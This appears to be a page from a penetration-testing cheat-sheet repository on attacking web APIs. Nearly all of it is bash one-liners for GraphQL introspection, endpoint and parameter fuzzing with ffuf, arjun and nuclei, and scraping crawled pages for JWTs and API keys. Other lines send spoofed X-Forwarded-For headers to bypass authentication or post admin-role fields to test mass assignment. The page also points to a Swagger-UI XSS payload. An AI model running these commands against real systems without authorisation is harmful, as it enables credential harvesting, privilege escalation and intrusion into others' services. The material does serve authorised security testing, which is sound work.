[← Back to README](../Readme.md)

---

## 🔌 API Security Testing

> 🧩 Related Nuclei templates: [`templates/nuclei/graphql-OFJAAAH.yaml`](../templates/nuclei/graphql-OFJAAAH.yaml) (GraphQL endpoint detection), [`templates/nuclei/docker2.yaml`](../templates/nuclei/docker2.yaml) (exposed Docker Registry API)
> 🧩 Swagger-UI XSS PoC: [`templates/payloads/swagger.json`](../templates/payloads/swagger.json) + [`swagger.yaml`](../templates/payloads/swagger.yaml) — see [`templates/README.md`](../templates/README.md)

### GraphQL Introspection
```bash
cat urls.txt | httpx -silent -path /graphql -mc 200 | xargs -I@ curl -s @ -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | grep -v "error"
```

### REST API Enumeration
```bash
cat alive.txt | httpx -silent -path /api/v1,/api/v2,/api/v3,/api/swagger.json -mc 200 | anew api_endpoints.txt
```

### JWT Analysis
```bash
cat urls.txt | httpx -silent | katana -d 3 -silent | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | anew jwts.txt
```

### API Key Leakage
```bash
cat urls.txt | httpx -silent | katana -d 3 -silent | grep -oiE "(api[_-]?key|apikey|api_secret)[=:]['\"]?[a-zA-Z0-9]{16,}['\"]?" | anew api_keys.txt
```

### Broken Authentication
```bash
# Test endpoints without auth
cat api_endpoints.txt | httpx -silent -mc 200 -fc 401,403 | anew no_auth_endpoints.txt
```

### Rate Limiting Test
```bash
for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/api/endpoint"; done | sort | uniq -c
```

### BOLA/IDOR Testing
```bash
cat urls.txt | grep -oE "(id|user_id|account_id|uid)=[0-9]+" | sed 's/=[0-9]*/=FUZZ/' | sort -u | anew bola_candidates.txt
```

### 💀 API Endpoint Fuzzing with ffuf
```bash
# ☠️ Fuzz API endpoints with common paths and methods
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403,405 -ac -c -t 100 -H "Content-Type: application/json" -o api_fuzz.json -of json
```

### 💀 API Version Fuzzing
```bash
# ☠️ Discover hidden API versions
ffuf -u https://target.com/api/vFUZZ/users -w <(seq 1 20) -mc 200,201,401,403 -ac -c && ffuf -u https://target.com/FUZZ/users -w <(echo -e "api\nv1\nv2\nv3\nv4\napi/v1\napi/v2\napi/v3\napi/internal\napi/private\napi/admin\napi/dev\napi/test\napi/staging\napi/beta") -mc 200,201,401,403 -ac -c
```

### 💀 REST API Methods Fuzzing
```bash
# ☠️ Test all HTTP methods on API endpoints
cat api_endpoints.txt | while read url; do for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method "$url" -H "Content-Type: application/json"); echo "$method $url - $CODE"; done; done | grep -vE " - (404|405)$" | anew api_methods.txt
```

### 💀 GraphQL Fuzzing with ffuf
```bash
# ☠️ Fuzz GraphQL endpoints for introspection and queries
ffuf -u https://target.com/FUZZ -w <(echo -e "graphql\ngraphiql\nplayground\nconsole\nquery\ngql\nv1/graphql\nv2/graphql\napi/graphql\napi/gql") -mc 200,400 -ac -c -H "Content-Type: application/json" -d '{"query":"{__typename}"}' -X POST -o graphql_endpoints.json
```

### 💀 API Parameter Fuzzing
```bash
# ☠️ Discover hidden API parameters with arjun + ffuf combo
cat api_endpoints.txt | xargs -I@ -P5 arjun -u @ -m POST -oT arjun_params.txt && cat api_endpoints.txt | xargs -I@ ffuf -u @?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,201,400,500 -ac -c -t 50 -o param_fuzz.json
```

### 💀 API Authentication Bypass Fuzzing
```bash
# ☠️ Test auth bypass techniques on protected endpoints
cat api_endpoints.txt | while read url; do curl -s -o /dev/null -w "%{http_code} - $url\n" "$url" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1"; done | grep "^200" | anew auth_bypass.txt
```

### 💀 OpenAPI/Swagger Fuzzing
```bash
# ☠️ Find and extract endpoints from OpenAPI specs
ffuf -u https://target.com/FUZZ -w <(echo -e "swagger.json\nswagger.yaml\nopenapi.json\nopenapi.yaml\napi-docs\napi-docs.json\nswagger-ui.html\nswagger/v1/swagger.json\nv1/swagger.json\nv2/swagger.json\nv3/swagger.json\napi/swagger.json\ndocs/api\napi/docs") -mc 200 -ac -c | tee swagger_found.txt | xargs -I@ curl -s @ | jq -r '.paths | keys[]' 2>/dev/null | anew swagger_paths.txt
```

### 💀 API JSON Fuzzing with Nuclei
```bash
# ☠️ Mass API fuzzing with nuclei DAST mode
cat api_endpoints.txt | httpx -silent -mc 200,201,401,403 | nuclei -dast -t dast/vulnerabilities/ -H "Content-Type: application/json" -rl 20 -c 5 -o api_nuclei_dast.txt
```

### 💀 API Mass Assignment Fuzzing
```bash
# ☠️ Test for mass assignment vulnerabilities
cat api_endpoints.txt | grep -iE "(user|account|profile|register|signup|update)" | xargs -I@ curl -s -X POST @ -H "Content-Type: application/json" -d '{"admin":true,"role":"admin","isAdmin":true,"is_admin":1,"privilege":"admin","access_level":9999}' -o /dev/null -w "%{http_code} - @\n" | grep -E "^(200|201|204)" | anew mass_assignment.txt
```

### 💀 API FUZZ with Custom Wordlist Generation
```bash
# ☠️ Generate API wordlist from JS files and fuzz
cat js.txt | xargs -I@ curl -s @ | grep -oE "[\"\']/(api|v[0-9])/[a-zA-Z0-9/_-]+[\"\']" | tr -d "\"'" | sort -u > custom_api_wordlist.txt && ffuf -u https://target.com/FUZZ -w custom_api_wordlist.txt -mc 200,201,204,401,403,500 -ac -c -t 80 -H "Authorization: Bearer null" -o custom_api_fuzz.json
```

---

[← Back to README](../Readme.md)
